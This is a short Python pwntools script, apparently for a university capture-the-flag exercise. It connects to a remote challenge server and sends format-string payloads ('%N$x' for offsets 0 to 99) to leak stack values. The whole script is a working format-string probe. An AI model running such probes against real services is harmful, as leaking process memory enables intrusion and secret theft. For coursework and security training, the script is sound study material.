from pwn import *

for i in range(100):
    try:
        c = remote('cs4401shell.walls.ninja',50203,level='error')
        c.recvline()
        c.sendline('%{}$x'.format(i).encode())
        result = c.recvline().decode()

        if result:
            print(str(i) + ': ' + str(result).strip())
        c.close()
    except EOFError:
        pass
